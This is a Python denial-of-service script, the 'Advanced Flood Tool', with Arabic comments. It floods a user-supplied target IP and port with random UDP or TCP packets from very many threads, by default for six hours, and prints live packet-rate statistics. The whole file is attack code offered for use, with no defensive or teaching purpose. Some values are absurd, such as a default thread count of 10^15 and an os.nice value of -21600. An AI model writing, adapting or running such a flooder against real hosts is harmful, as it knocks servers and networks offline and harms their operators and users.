#!/usr/bin/env python3
# Code by LeeOn123 - Enhanced Version
import argparse
import random
import socket
import threading
import time
import sys
import os
import ctypes
import struct
from concurrent.futures import ThreadPoolExecutor

# زيادة أولوية العملية (يتطلب صلاحيات مدير)
def set_high_priority():
    try:
        if os.name == 'nt':  # Windows
            import win32api, win32process, win32con
            handle = win32api.GetCurrentProcess()
            win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
        else:  # Linux/Mac
            os.nice(-21600)
    except:
        pass

# إنشاء بيانات عشوائية بحجم متغير
def generate_random_data():
    sizes = [1024, 2048, 4096, 8192, 16384, 32768, 65507]
    size = random.choice(sizes)
    
    # أنواع مختلفة من البيانات العشوائية
    data_types = [
        lambda: random._urandom(size),  # بيانات عشوائية عادية
        lambda: os.urandom(size),       # بيانات عشوائية آمنة
        lambda: bytes([random.randint(0, 255) for _ in range(size)]),  # بايت عشوائي
        lambda: struct.pack('!HH', random.randint(0, 65535), random.randint(0, 65535)) * (size // 4),  # حزم شبكية
        lambda: b'\x00' * size,  # بيانات فارغة
        lambda: b'\xff' * size,  # بيانات مملوءة
    ]
    
    return random.choice(data_types)()

class AdvancedFlooder:
    def __init__(self, target_ip, target_port, use_udp=True, threads=1000, duration=0):
        self.target_ip = target_ip
        self.target_port = target_port
        self.use_udp = use_udp
        self.max_threads = min(threads, 10000000000000000000000)  # تحديد حد أقصى
        self.duration = duration  # 0 يعني إلى الأبد
        self.running = True
        self.packets_sent = 0
        self.errors = 0
        self.thread_pool = ThreadPoolExecutor(max_workers=self.max_threads)
        
        # إحصائيات
        self.stats_lock = threading.Lock()
        self.start_time = time.time()
        
        # قائمة سوكيتات مسبقة الإنشاء (لـ TCP)
        self.socket_pool = []
        if not use_udp:
            self._precreate_sockets(100)
    
    def _precreate_sockets(self, count):
        """إنشاء سوكيتات مسبقاً لتحسين الأداء"""
        for _ in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                self.socket_pool.append(s)
            except:
                pass
    
    def _get_socket(self):
        """الحصول على سوكيت من البركة أو إنشاء جديد"""
        if not self.use_udp and self.socket_pool:
            return self.socket_pool.pop()
        return None
    
    def _return_socket(self, sock):
        """إعادة السوكيت إلى البركة"""
        if not self.use_udp:
            self.socket_pool.append(sock)
    
    def udp_flood(self):
        """هجوم UDP مع بيانات عشوائية متغيرة"""
        while self.running:
            try:
                # بيانات عشوائية مختلفة في كل مرة
                data = generate_random_data()
                
                # إنشاء سوكيت جديد لكل دفعة
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # إرسال متعدد في كل اتصال
                for _ in range(random.randint(1, 100)):
                    sock.sendto(data, (self.target_ip, self.target_port))
                    with self.stats_lock:
                        self.packets_sent += 1
                
                sock.close()
                
                # تغيير حجم البيانات بشكل عشوائي
                time.sleep(random.uniform(0.000000000001, 0.01))
                
            except Exception as e:
                with self.stats_lock:
                    self.errors += 1
    
    def tcp_flood(self):
        """هجوم TCP مع اتصالات متعددة"""
        while self.running:
            try:
                sock = self._get_socket()
                if not sock:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.settimeout(2)
                
                # محاولة الاتصال
                sock.connect((self.target_ip, self.target_port))
                
                # إرسال بيانات عشوائية متعددة
                for _ in range(random.randint(10, 1000)):
                    data = generate_random_data()
                    sock.send(data)
                    with self.stats_lock:
                        self.packets_sent += 1
                
                # إعادة السوكيت إلى البركة
                self._return_socket(sock)
                
                # فاصل عشوائي قصير
                time.sleep(random.uniform(0.001, 0.1))
                
            except Exception as e:
                with self.stats_lock:
                    self.errors += 1
                try:
                    sock.close()
                except:
                    pass
    
    def mixed_flood(self):
        """هجوم مختلط (UDP + TCP)"""
        while self.running:
            # اختيار عشوائي بين UDP وTCP
            if random.choice([True, False]):
                self.udp_flood()
            else:
                self.tcp_flood()
    
    def start_attack(self):
        """بدء الهجوم"""
        print(f"[+] Starting attack on {self.target_ip}:{self.target_port}")
        print(f"[+] Protocol: {'UDP' if self.use_udp else 'TCP'}")
        print(f"[+] Threads: {self.max_threads}")
        print(f"[+] Duration: {'Infinite' if self.duration == 0 else f'{self.duration} seconds'}")
        print("[+] Generating random data patterns...")
        
        # بدء مؤشر العرض
        stats_thread = threading.Thread(target=self._show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # بدء الهجمات
        attack_method = self.udp_flood if self.use_udp else self.tcp_flood
        
        # استخدام ThreadPoolExecutor للأداء الأمثل
        futures = []
        for _ in range(self.max_threads):
            future = self.thread_pool.submit(attack_method)
            futures.append(future)
        
        # إذا كان هناك مدة محددة
        if self.duration > 0:
            time.sleep(self.duration)
            self.stop_attack()
        else:
            # الانتظار حتى Ctrl+C
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()
    
    def _show_stats(self):
        """عرض الإحصائيات"""
        while self.running:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                pps = self.packets_sent / elapsed
                
                print(f"\r[+] Packets: {self.packets_sent:,} | "
                      f"Errors: {self.errors:,} | "
                      f"PPS: {pps:,.0f} | "
                      f"Time: {elapsed:.1f}s", end="")
            
            time.sleep(1)
    
    def stop_attack(self):
        """إيقاف الهجوم"""
        print("\n[+] Stopping attack...")
        self.running = False
        self.thread_pool.shutdown(wait=False)
        
        # إغلاق جميع السوكيتات
        for sock in self.socket_pool:
            try:
                sock.close()
            except:
                pass
        
        elapsed = time.time() - self.start_time
        print(f"\n[+] Attack finished!")
        print(f"[+] Total packets sent: {self.packets_sent:,}")
        print(f"[+] Total errors: {self.errors:,}")
        print(f"[+] Average PPS: {self.packets_sent/elapsed:,.0f}")
        print(f"[+] Total time: {elapsed:.2f} seconds")

def main():
    parser = argparse.ArgumentParser(description="Advanced Flood Tool")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=0, help="Target port (0 for random)")
    parser.add_argument("-t", "--threads", type=int, default=1000000000000000, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=21600, help="Attack duration in seconds (0 for infinite)")
    parser.add_argument("-u", "--udp", action="store_true", help="Use UDP (default: TCP)")
    parser.add_argument("-m", "--mixed", action="store_true", help="Mixed UDP/TCP attack")
    parser.add_argument("--high-priority", action="store_true", help="Set high process priority")
    
    args = parser.parse_args()
    
    # تعيين أولوية عالية إذا طلب
    if args.high_priority:
        set_high_priority()
    
    # اختيار البورت العشوائي إذا لم يتم تحديده
    target_port = args.port
    if target_port == 0:
        target_port = random.randint(1, 65535)
        print(f"[*] Using random port: {target_port}")
    
    # إنشاء مهاجم
    flooder = AdvancedFlooder(
        target_ip=args.ip,
        target_port=target_port,
        use_udp=args.udp or args.mixed,
        threads=args.threads,
        duration=args.duration
    )
    
    # بدء الهجوم
    try:
        if args.mixed:
            flooder.mixed_flood = flooder.mixed_flood.__get__(flooder)
            flooder.start_attack()
        else:
            flooder.start_attack()
    except Exception as e:
        print(f"[!] Error: {e}")
        flooder.stop_attack()

if __name__ == "__main__":
    main()
